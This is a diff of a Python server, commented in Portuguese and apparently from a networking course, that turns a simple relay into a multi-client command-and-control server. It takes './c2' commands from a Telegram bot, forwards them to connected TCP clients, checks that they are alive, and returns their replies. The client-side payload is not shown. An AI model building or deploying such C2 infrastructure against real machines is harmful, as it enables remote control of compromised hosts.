@@ -20,71 +20,314 @@
 
 # Importando bibliotecas
 from constantes import *
-import requisicoes, socket
+import requisicoes, funcoes, socket, threading, time
 
-def main():
-    print("Para acessar o bot, pesquise @progredes_c2_bot ou clique no link direto: https://t.me/progredes_c2_bot")
-    print("Para encerrar o bot, pressione Ctrl-C\n")
+# Função para testar se um cliente, identificado pelo seu índice,
+# está presente na lista de clientes e se o mesmo está livre para
+# realizar uma transmissão
+def cliente_existe_livre(index: int):
+    cliente = clientes[index]
+    while (cliente in clientes):
+        if (not clientes[index][1].locked()):
+            break
 
-    # Criando socket TCP e desabilitando TIME_WAIT
+    if (cliente in clientes):
+        return True
+
+    return False
+
+# Função para testar se um cliente, identificado pelo seu índice,
+# está online
+def cliente_online(index: int):
+    global clientes
+
+    # Testando se o cliente existe e está livre para transmissão e, se
+    # não existir, retorna-se o índice
+    if (not cliente_existe_livre(index)):
+        return index
+
+    # Travando transmissões para o cliente e tentando enviar mensagem
+    # "ping" e, em caso de excessão, destrava-se as transmissões do
+    # cliente, finaliza-se o socket do cliente, remove-se o mesmo da
+    # lista de clientes e retorna-se o índice
+    clientes[index][1].acquire()
+    try:
+        clientes[index][0][0].send("alive?".encode(CHARSET))
+    except:
+        clientes[index][1].release()
+        print(f"Cliente {clientes[index][0][1]} desconectado!")
+        clientes[index][0][0].close()
+        clientes.pop(index)
+        return index
+
+    # Tentando obter resposta do cliente e, em caso de exceção,
+    # destrava-se as transmissões do cliente, finaliza-se o socket do
+    # cliente, remove-se o mesmo da lista de clientes e retorna-se o
+    # índice
+    try:
+        resposta = clientes[index][0][0].recv(TAMANHO_BUFFER).decode(CHARSET)
+    except:
+        clientes[index][1].release()
+        print(f"Cliente {clientes[index][0][1]} desconectado!")
+        clientes[index][0][0].close()
+        clientes.pop(index)
+        return index
+
+    # Destravando as transmissões do cliente
+    clientes[index][1].release()
+
+    # Se o tamanho da resposta do cliente for menor que 1, finaliza-se
+    # o socket do cliente, remove-se o mesmo da lista de clientes e
+    # retorna-se o índice
+    if (len(resposta) < 1):
+        print(f"Cliente {clientes[index][0][1]} desconectado!")
+        clientes[index][0][0].close()
+        clientes.pop(index)
+        return index
+
+    # Se a resposta do "ping" estiver incorreta, destrava-se as
+    # transmissões para o cliente e retorna-se o índice
+    if (resposta != "alive!"):
+        return index
+
+    # Atualizando momento da última verificação do cliente,
+    # destravando as transmissões para o cliente e retornando o índice
+    # mais um
+    clientes[index][2]["ultima_verificacao"] = time.time()
+    return index + 1
+
+# Função para testar, periodicamente, se todos os clientes ainda
+# estão conectados ao servidor
+def testar_conexoes():
+    while (continuar):
+        time.sleep(TIMEOUT)
+
+        if (len(clientes) < 1):
+            continue
+
+        index = 0
+        while (index < len(clientes)):
+            index = cliente_online(index)
+
+    return
+
+# Função para parar o servidor
+def parar_servidor():
+    global continuar
+    continuar = False
+
+    print(f"\nEncerrando servidor em {TIMEOUT} segundos...")
+    return
+
+# Função para iniciar servidor e gerenciar conexões
+def gerenciar_servidor():
+    global clientes
+
+    # Criando socket TCP e desabilitando estado de TIME_WAIT do mesmo
     server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    server_sock.settimeout(TIMEOUT)
 
     # Habilitando socket
-    server_sock.bind(SOCKET_SERVIDOR)
+    try:
+        server_sock.bind(SOCKET_SERVIDOR)
+        server_sock.listen()
+    except:
+        print(f"Erro: outra aplicação já está utilizando a porta {SOCKET_SERVIDOR[1]}!")
+        parar_servidor()
+        server_sock.close()
+        return
 
-    # Escutando até o máximo de conexões simultaneas permitidas
-    server_sock.listen(CONEXOES_MAXIMAS)
+    # Iniciando thread para teste periódico das conexões
+    testes = threading.Thread(target=testar_conexoes)
+    testes.start()
 
-    # Loop de funcionamento do bot
-    continuar = True
-    latest_update_id = 0
+    # Recebendo conexões e as apresentando
     while (continuar):
-        # Recebendo conexão do cliente e o apresentando
         try:
-            client_sock, socket_cliente = server_sock.accept()
+            clientes.append([server_sock.accept(), threading.Lock()])
         except:
-            print()
-            break
-        print(f"Cliente {socket_cliente} conectado!")
+            continue
+        clientes[-1].append({
+            "momento_conexao": time.time(),
+            "ultima_verificacao": 0
+        })
 
-        while (continuar):
-            # Obtendo última atualização e mensagem e, em caso de exceção,
-            # tenta-se novamente
-            try:
-                latest_update_id, latest_message = requisicoes.obter_atualizacoes(latest_update_id)
-            except KeyboardInterrupt:
-                continuar = False
-                continue
-            except:
-                continue
-
-            # Se não houver novas mensagens, volta-se ao início
-            if (latest_message == None):
-                continue
-
-            # Interpretando mensagem e salvando última atalização
-            retorno = requisicoes.interpretar_mensagem(latest_message)
-            requisicoes.salvar_update_id(latest_update_id)
-            if (retorno["text"] == '' or retorno["text"] == "./c2 -h" or retorno["text"] == "./c2 -l"):
-                requisicoes.responder_mensagem(retorno)
-                continue
-
-            # Enviando mensagem obtida ao cliente
-            client_sock.send(retorno["text"].encode(CHARSET))
-
-            # Recebendo mensagem do cliente e respondendo à última mensagem
-            retorno["text"] = client_sock.recv(TAMANHO_BUFFER).decode(CHARSET)
-            if (len(retorno["text"]) == 0):
-                retorno["text"] = f"Cliente {socket_cliente} desconectado!"
-                requisicoes.responder_mensagem(retorno)
-                print(f"Cliente {socket_cliente} desconectado!")
-                break
-            requisicoes.responder_mensagem(retorno)
-
-        client_sock.close()
+        print(f"Cliente {clientes[-1][0][1]} conectado!")
 
     server_sock.close()
+    return
+
+# Função para testar se uma verificação de conectividade irá
+# ocorrer e, se sim, aguardar sua finalização
+def aguardar_verificacao(index: int):
+    cliente = clientes[index]
+    while (cliente in clientes[index]):
+        if (time.time() - clientes[index][2]["ultima_verificacao"] < TIMEOUT - 1):
+            break
+
+        time.sleep(1)
+
+    return
+
+# Função para responder mensagem informando desconexão de cliente
+# e finalizar o socket do mesmo
+def informar_desconectado(index: int, retorno: dict):
+    retorno["text"] = f"Cliente {clientes[index][0][1]} desconectado!"
+    requisicoes.responder_mensagem(retorno)
+    print(f"Cliente {clientes[index][0][1]} desconectado!")
+    clientes[index][0][0].close()
+    clientes.pop(index)
+
+    return
+
+def main():
+    # Armazenando, globalmente, variável de continuidade da execução
+    # do servidor e lista de clientes
+    global continuar, clientes
+    continuar = True
+    clientes = []
+
+    # Iniciando thread para inicio e gerenciamento do servidor
+    servidor = threading.Thread(target=gerenciar_servidor)
+    servidor.start()
+
+    # Se o programa poder continuar, apresenta-se informações do bot
+    if (continuar):
+        print("Para acessar o bot, acesse @progredes_c2_bot no Telegram ou clique no link direto: https://t.me/progredes_c2_bot")
+        print("Para encerrar o bot, pressione Ctrl-c\n")
+
+    # Loop de funcionamento do bot
+    latest_update_id = 0
+    while (continuar):
+        # Obtendo última atualização e mensagem e, em caso de exceção,
+        # tenta-se novamente
+        try:
+            latest_update_id, latest_message = requisicoes.obter_atualizacoes(latest_update_id)
+        except KeyboardInterrupt:
+            parar_servidor()
+            continue
+        except:
+            continue
+
+        # Se não houver novas mensagens, volta-se ao início
+        if (latest_message == None):
+            continue
+
+        # Salvando última atualização
+        requisicoes.salvar_update_id(latest_update_id)
+
+        # Lendo ID do chat e da mensagem e montando dicionário de retorno
+        chat_id = latest_message["message"]["chat"]["id"]
+        message_id = latest_message["message"]["message_id"]
+        retorno = {
+            "chat_id": chat_id,
+            "reply_to_message_id": message_id,
+            "parse_mode": "Markdown",
+            "text": ''
+        }
+
+        # Se não há texto na mensagem recebida, responde-se à mensagem
+        if (not "text" in latest_message["message"]):
+            requisicoes.responder_mensagem(retorno)
+            continue
+
+        # Analisando se mensagem recebida é válida e respondendo com ação
+        # correspondente
+        message_text = latest_message["message"]["text"]
+        tokens = message_text.split()
+        if (len(tokens) == 1 and (tokens[0] == "./c2" or tokens[0] == "/start")):
+            retorno["text"] = "./c2 -h"
+            requisicoes.responder_mensagem(retorno)
+            continue
+        elif (tokens[0] != "./c2"):
+            requisicoes.responder_mensagem(retorno)
+            continue
+        elif (tokens[1] == "-h"):
+            retorno["text"] = "./c2 -h"
+            requisicoes.responder_mensagem(retorno)
+            continue
+
+        # Analisando conteúdo da mensagem recebida e respondendo com sua
+        # ação correspondente
+        if (len(clientes) < 1 and message_text != "./c2 -q 0"):
+            retorno["text"] = f"Não há clientes conectados!"
+            requisicoes.responder_mensagem(retorno)
+            continue
+        elif (tokens[1] == "-l"):
+            retorno["text"] = "./c2 -l"
+            requisicoes.responder_mensagem(retorno)
+            continue
+        elif (tokens[1] == "-s"):
+            retorno["text"] = "./c2 -s"
+            requisicoes.responder_mensagem(retorno)
+            continue
+
+        # Analisando se mensagem possui mais ou menos de três argumentos
+        # e, se tiver três, se o terceiro é um número inteiro
+        if (len(tokens) < 3 or len(tokens) > 3):
+            requisicoes.responder_mensagem(retorno)
+            continue
+        elif (not funcoes.ehinteiro(tokens[2])):
+            requisicoes.responder_mensagem(retorno)
+            continue
+
+        # Obtendo índice do cliente e, se o comando for o de "parar" e o
+        # índice for -1, para-se o servidor. Se não, se o índice for
+        # inválido, responde-se com aviso
+        index = int(tokens[2]) - 1
+        if (tokens[1] == "-q" and index == -1):
+            retorno["text"] = f"Encerrando servidor em {TIMEOUT} segundos..."
+            requisicoes.responder_mensagem(retorno)
+            parar_servidor()
+            continue
+        elif (index < 0 or index >= len(clientes)):
+            retorno["text"] = f"""ID inválido!
+
+Digite `./c2 -l` para obter a lista de IDs disponíveis"""
+            requisicoes.responder_mensagem(retorno)
+            continue
+
+        # Testando se o cliente está disponível para receber mensagem e,
+        # se o mesmo deixar de existir, informa-se desconexão do mesmo
+        aguardar_verificacao(index)
+        if (not cliente_existe_livre(index)):
+            informar_desconectado(index, retorno)
+            continue
+
+        # Travando transmissões para o cliente e tentando enviar mensagem
+        # obtida ao cliente e, em caso de exceção, destrava-se as
+        # transmissões do cliente e informa-se desconexão do mesmo
+        clientes[index][1].acquire()
+        try:
+            clientes[index][0][0].send(message_text.encode(CHARSET))
+        except:
+            clientes[index][1].release()
+            informar_desconectado(index, retorno)
+            continue
+
+        # Tentando receber mensagem do cliente e, em caso de exceção,
+        # destrava-se as transmissões para o mesmo e informa-se desconexão
+        # do mesmo
+        try:
+            retorno["text"] = clientes[index][0][0].recv(TAMANHO_BUFFER).decode(CHARSET)
+        except:
+            clientes[index][1].release()
+            informar_desconectado(index, retorno)
+            continue
+
+        # Destravando as transmissões do cliente
+        clientes[index][1].release()
+
+        # Se o tamanho da resposta for menor que 1, informa-se desconexão
+        # do cliente
+        if (len(retorno["text"]) < 1):
+            informar_desconectado(index, retorno)
+            continue
+
+        # Respondendo mensagem com resposta do cliente
+        requisicoes.responder_mensagem(retorno)
+
     return
 
 # Entrando na função main e, em caso de exceção, saindo
